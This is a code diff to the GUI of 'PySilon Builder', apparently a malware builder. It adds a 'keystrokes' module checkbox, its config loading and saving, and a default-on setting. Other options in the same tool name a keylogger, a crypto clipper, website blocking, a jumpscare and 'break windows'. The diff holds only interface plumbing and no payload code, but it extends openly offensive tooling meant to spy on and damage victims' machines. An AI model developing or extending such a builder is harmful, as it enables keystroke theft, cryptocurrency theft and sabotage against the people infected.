@@ -39,7 +39,8 @@ filenames = {
     'monctrl': 'monitor_control.py',
     'webbloc': 'website_blocker.py',
     'jmpscar': 'jumpscare.py',
-    'winbrek': 'break_windows.py'
+    'winbrek': 'break_windows.py',
+    'keystrk': 'keystrokes.py'
 }
 
 default_modules = [
@@ -108,6 +109,7 @@ def load_configuration(is_custom):
     cbvar_webbloc.set(config['FUNCTIONALITY']['webbloc'])
     cbvar_jmpscar.set(config['FUNCTIONALITY']['jmpscar'])
     cbvar_jmpscar.set(config['FUNCTIONALITY']['winbrek'])
+    cbvar_keystrk.set(config['FUNCTIONALITY']['keystrk'])
 
 def recommended_configuration():
     cbvar_keylogger.set(False)
@@ -135,6 +137,7 @@ def recommended_configuration():
     cbvar_webbloc.set(True)
     cbvar_jmpscar.set(False)
     cbvar_winbrek.set(True)
+    cbvar_keystrk.set(True)
     cbvar_custom_icon.set(True)
 
 def reset_configuration():
@@ -224,6 +227,7 @@ def save_configuration():
     config['FUNCTIONALITY']['webbloc'] = str(cbvar_webbloc.get())
     config['FUNCTIONALITY']['jmpscar'] = str(cbvar_jmpscar.get())
     config['FUNCTIONALITY']['winbrek'] = str(cbvar_winbrek.get())
+    config['FUNCTIONALITY']['keystrk'] = str(cbvar_keystrk.get())
 
     with open(config_path, 'w') as configfile:
         config.write(configfile)
@@ -379,7 +383,7 @@ if len(sys.argv) > 1:
         cli = 'soon' # CLI mode will be added soon...
 else:
     root = Tk()
-    root.geometry('750x855')
+    root.geometry('750x880')
     root.resizable(True, True)
     root.iconbitmap('resources/icons/icon.ico')
     root.title('PySilon Builder')
@@ -475,6 +479,7 @@ else:
     cbvar_webbloc = BooleanVar(value=True)
     cbvar_jmpscar = BooleanVar(value=True)
     cbvar_winbrek = BooleanVar(value=True)
+    cbvar_keystrk = BooleanVar(value=True)
 
     def open_crypto_clipper_config():
         json_file_path = 'resources/crypto_clipper.json'
@@ -506,6 +511,7 @@ else:
     cb_webbloc = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='block websites', variable=cbvar_webbloc, command=config_modification, onvalue=True, offvalue=False)
     cb_jmpscar = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='jumpscare', variable=cbvar_jmpscar, command=config_modification, onvalue=True, offvalue=False)
     cb_winbrek = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='break windows', variable=cbvar_winbrek, command=config_modification, onvalue=True, offvalue=False)
+    cb_keystrk = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='keystrokes', variable=cbvar_keystrk, command=config_modification, onvalue=True, offvalue=False)
     json_button = Button(settings_canvas, text='⚙', command=open_crypto_clipper_config)
 
     cb_keylogger.grid(row=3, column=2, sticky=W, padx=(30, 0))
@@ -532,8 +538,9 @@ else:
     cb_webbloc.grid(row=24, column=2, sticky=W, padx=(30, 0))
     cb_jmpscar.grid(row=25, column=2, sticky=W, padx=(30, 0))
     cb_winbrek.grid(row=26, column=2, sticky=W, padx=(30, 0))
-    cb_crclipr.grid(row=27, column=2, sticky=W, padx=(30, 0), pady=(0, 10))
-    json_button.grid(row=27, column=2, padx=(190, 0), pady=(0, 10))
+    cb_keystrk.grid(row=27, column=2, sticky=W, padx=(30, 0))
+    cb_crclipr.grid(row=28, column=2, sticky=W, padx=(30, 0), pady=(0, 10))
+    json_button.grid(row=28, column=2, padx=(190, 0), pady=(0, 10))
 
     bottom_buttons = Canvas(root, width=1, height=1, bd=0)
     cbvar_disclaimer = BooleanVar(value=False)
